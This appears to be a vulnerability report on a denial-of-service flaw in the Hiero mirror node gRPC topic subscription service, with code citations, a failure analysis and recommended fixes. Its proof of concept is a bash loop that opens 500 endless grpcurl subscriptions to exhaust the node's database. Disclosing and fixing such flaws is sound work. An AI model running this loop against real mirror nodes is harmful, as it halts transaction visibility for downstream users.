### Title
Unbounded Throttled Historical Subscription Polling Causes Linear DB Amplification DoS

### Summary
Any unauthenticated client can open an arbitrary number of gRPC connections and subscribe to a topic with a very old `startTime` and no `limit`. Each subscription enters an infinite polling loop at 2-second intervals fetching 1000 rows per poll from the database. Because there is no global subscription count cap, no per-IP connection limit, and no total-duration timeout, DB load scales linearly with attacker connections until the database is exhausted and transaction confirmation fails.

### Finding Description

**Exact code path:**

`ConsensusController.subscribeTopic()` → `TopicMessageServiceImpl.subscribeTopic()` → `PollingTopicMessageRetriever.retrieve(filter, true)`.

`TopicMessageServiceImpl` hardcodes `throttled=true` on line 63:
```java
Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
``` [1](#0-0) 

Inside `PollingTopicMessageRetriever`, the `PollingContext` constructor for `throttled=true` sets:
- `numRepeats = Long.MAX_VALUE` — effectively infinite
- `frequency = pollingFrequency` (default 2 s)
- `maxPageSize = 1000` [2](#0-1) 

The `isComplete()` predicate for the throttled path returns `true` only when the last page returned **fewer than `maxPageSize` rows**, or the limit is hit:
```java
if (throttled) {
    return pageSize.get() < retrieverProperties.getMaxPageSize() || limitHit;
}
``` [3](#0-2) 

When a topic has more than 1000 historical messages and the client supplies a very old `startTime` with no `limit`, every poll returns exactly 1000 rows, `isComplete()` always returns `false`, and the `RepeatSpec` (with `numRepeats = Long.MAX_VALUE`) keeps re-scheduling `poll()` every 2 seconds indefinitely. [4](#0-3) 

**Why the existing safeguards fail:**

1. **`timeout = 60 s`** — applied as `.timeout(retrieverProperties.getTimeout(), scheduler)`, which is a Reactor *per-item* timeout. Because 1000 rows are emitted on every 2-second poll, items flow continuously and the timeout never fires. [5](#0-4) [6](#0-5) 

2. **`maxConcurrentCallsPerConnection = 5`** — limits calls per single TCP connection, but there is no limit on the number of TCP connections an attacker may open. [7](#0-6) [8](#0-7) 

3. **`subscriberCount`** — tracked as a Micrometer gauge only; no enforcement gate rejects new subscriptions when a threshold is exceeded. [9](#0-8) 

4. **No authentication** — the only server interceptor sets an endpoint-context string; it performs no credential or rate-limit check. [10](#0-9) 

5. **`retryWhen(Retry.backoff(Long.MAX_VALUE, ...))`** — any transient DB error is retried forever, preventing even DB-side errors from terminating the subscription. [11](#0-10) 

### Impact Explanation

Each attacker subscription issues one `SELECT … LIMIT 1000` query every 2 seconds. With N TCP connections × 5 calls each, the sustained DB read rate is `N × 5 × 500 rows/s`. PostgreSQL connection pool exhaustion and I/O saturation prevent the importer from writing new consensus transactions, causing the mirror node to stop confirming transactions — a total network-visibility shutdown for downstream consumers. The mirror node's own DB connection pool (`hikaricp`) is shared between the retriever and the importer; saturating it starves the importer of connections. [12](#0-11) 

### Likelihood Explanation

The gRPC port (5600) is publicly exposed with no authentication. Any attacker with network access and a standard gRPC client (e.g., `grpcurl`) can trigger this. The only prerequisite is a topic with more than 1000 historical messages, which is trivially satisfied on mainnet/testnet. The attack is fully repeatable, requires no special privileges, and can be automated with a simple loop opening connections. [13](#0-12) 

### Recommendation

1. **Enforce a global maximum active subscription count** in `TopicMessageServiceImpl.subscribeTopic()`: reject new subscriptions when `subscriberCount` exceeds a configurable threshold (e.g., 500).
2. **Add a wall-clock total-duration timeout** on the historical retrieval flux (distinct from the per-item timeout), e.g., `Flux.timeout(Duration.ofMinutes(5))` wrapping the entire `retrieve()` result.
3. **Limit connections per source IP** at the Netty level via `NettyServerBuilder.maxConnectionsPerIp()` or an equivalent load-balancer policy.
4. **Require a non-zero `limit`** or a bounded `endTime` for subscriptions that start in the past, rejecting open-ended historical scans.
5. **Separate DB connection pools** for the retriever and the importer so retriever saturation cannot starve importer writes.

### Proof of Concept

```bash
# Prerequisites: a topic (e.g., 0.0.41110) with >1000 messages on the target network.
# Open 100 connections × 5 subscriptions each = 500 concurrent infinite polling loops.

for i in $(seq 1 100); do
  for j in $(seq 1 5); do
    grpcurl -plaintext \
      -d '{"topicID":{"topicNum":41110},"consensusStartTime":{"seconds":0,"nanos":0}}' \
      <MIRROR_NODE_HOST>:5600 \
      com.hedera.mirror.api.proto.ConsensusService/subscribeTopic &
  done
done

# Each background process holds a streaming RPC open.
# Each RPC triggers PollingTopicMessageRetriever.retrieve(filter, true):
#   - numRepeats = Long.MAX_VALUE
#   - pollingFrequency = 2s
#   - maxPageSize = 1000 rows per poll
#   - isComplete() never returns true (full pages returned continuously)
# Monitor DB CPU/connections: they climb linearly until the importer
# can no longer acquire a connection and transaction confirmation halts.
```

### Citations

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L48-55)
```java
    private final AtomicLong subscriberCount = new AtomicLong(0L);

    @PostConstruct
    void init() {
        Gauge.builder("hiero.mirror.grpc.subscribers", () -> subscriberCount)
                .description("The number of active subscribers")
                .tag("type", TopicMessage.class.getSimpleName())
                .register(meterRegistry);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java (L63-63)
```java
        Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L51-62)
```java
        return Flux.defer(() -> poll(context))
                .repeatWhen(RepeatSpec.create(r -> !context.isComplete(), context.getNumRepeats())
                        .jitter(0.1)
                        .withFixedDelay(context.getFrequency())
                        .withScheduler(scheduler))
                .name(METRIC)
                .tap(Micrometer.observation(observationRegistry))
                .retryWhen(Retry.backoff(Long.MAX_VALUE, Duration.ofSeconds(1)))
                .timeout(retrieverProperties.getTimeout(), scheduler)
                .doOnCancel(context::onComplete)
                .doOnComplete(context::onComplete)
                .doOnNext(context::onNext);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L98-107)
```java
            if (throttled) {
                numRepeats = Long.MAX_VALUE;
                frequency = retrieverProperties.getPollingFrequency();
                maxPageSize = retrieverProperties.getMaxPageSize();
            } else {
                RetrieverProperties.UnthrottledProperties unthrottled = retrieverProperties.getUnthrottled();
                numRepeats = unthrottled.getMaxPolls();
                frequency = unthrottled.getPollingFrequency();
                maxPageSize = unthrottled.getMaxPageSize();
            }
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/PollingTopicMessageRetriever.java (L121-128)
```java
        boolean isComplete() {
            boolean limitHit = filter.hasLimit() && filter.getLimit() == total.get();

            if (throttled) {
                return pageSize.get() < retrieverProperties.getMaxPageSize() || limitHit;
            }

            return limitHit;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/RetrieverProperties.java (L21-26)
```java
    @Min(32)
    private int maxPageSize = 1000;

    @NotNull
    private Duration pollingFrequency = Duration.ofSeconds(2L);

```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/retriever/RetrieverProperties.java (L27-28)
```java
    @NotNull
    private Duration timeout = Duration.ofSeconds(60L);
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java (L13-14)
```java
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
```

**File:** grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java (L32-33)
```java
            serverBuilder.executor(applicationTaskExecutor);
            serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```

**File:** grpc/src/test/java/org/hiero/mirror/grpc/interceptor/GrpcInterceptor.java (L13-22)
```java
public class GrpcInterceptor implements ServerInterceptor {

    @Override
    public <ReqT, RespT> ServerCall.Listener<ReqT> interceptCall(
            ServerCall<ReqT, RespT> call, Metadata headers, ServerCallHandler<ReqT, RespT> next) {
        final var fullMethod = call.getMethodDescriptor().getFullMethodName();
        final var methodName = fullMethod.substring(fullMethod.lastIndexOf('.') + 1);
        EndpointContext.setCurrentEndpoint(methodName);
        return next.startCall(call, headers);
    }
```

**File:** docs/grpc/README.md (L14-16)
```markdown
Example invocation using [grpcurl](https://github.com/fullstorydev/grpcurl):

`grpcurl -plaintext -d '{"topicID": {"topicNum": 41110}, "limit": 0}' localhost:5600 com.hedera.mirror.api.proto.ConsensusService/subscribeTopic`
```
